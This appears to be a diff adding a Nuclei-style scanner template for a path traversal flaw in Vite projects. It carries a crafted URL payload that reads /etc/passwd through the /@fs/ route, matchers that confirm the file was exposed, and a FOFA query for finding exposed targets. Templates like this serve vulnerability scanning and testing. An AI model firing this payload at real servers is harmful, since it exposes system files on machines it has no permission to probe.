@@ -1,0 +1,29 @@
+id: path-traversal-vite-project
+info:
+  name: Path Traversal in Vite Project
+  author: AutoPOCGenerator
+  severity: high
+  description: A path traversal vulnerability exists in the Vite project, allowing
+    attackers to read arbitrary files on the server by manipulating the path in the
+    URL.
+  reference: []
+  tags:
+  - path-traversal
+  - vite
+  metadata:
+    fofa-query: app="Vite"
+requests:
+- method: GET
+  path:
+  - '{{BaseURL}}/@fs/x/x/x/vite-project/?/../../../../../etc/passwd?import&?inline=1.wasm?init'
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    words:
+    - root:x:0:0:root:/root:/bin/bash
+  - type: regex
+    regex:
+    - root:.*:0:0:.*
